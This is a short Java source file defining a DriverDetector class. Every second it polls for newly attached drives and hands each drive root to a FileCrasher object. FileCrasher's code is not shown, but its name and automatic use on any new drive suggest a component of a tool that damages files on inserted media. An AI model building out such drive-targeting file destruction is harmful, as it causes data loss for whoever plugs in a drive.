package naoh.client;

import naoh.client.interfaces.DetectRule;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

public class DriverDetector {
    private static DriverDetector dec;

    public static DriverDetector init(DetectRule rule) {
        Application.exitUnlessSingleton();//第二次确认单例模式。仅仅是保险起见。
        if (dec == null) dec = new DriverDetector(rule);
        else Log.e("DRIVER DETECTOR IS EXECUTED MORE THAN ONCE UNEXPECTEDLY(NO INFLUENCE TO RUNNING)");
        return dec;
    }

    DetectRule rule;

    private DriverDetector(DetectRule rule) {
        this.rule = rule;

        Timer t = new Timer();
        t.schedule(new Task(), 100, 1000);
    }

    private class Task extends TimerTask {

        @Override
        public void run() {
            rule.findChanges().forEach(DriverDetector.this::cover);
        }

    }

    private void cover(File rootFilePath) {
        Log.v(String.format("OPERATION OF DRIVER %s HAS REQUIRED", rootFilePath.getAbsolutePath()));
        FileCrasher fileCrasher = new FileCrasher(rootFilePath, new DefaultFileFilter());
    }


}



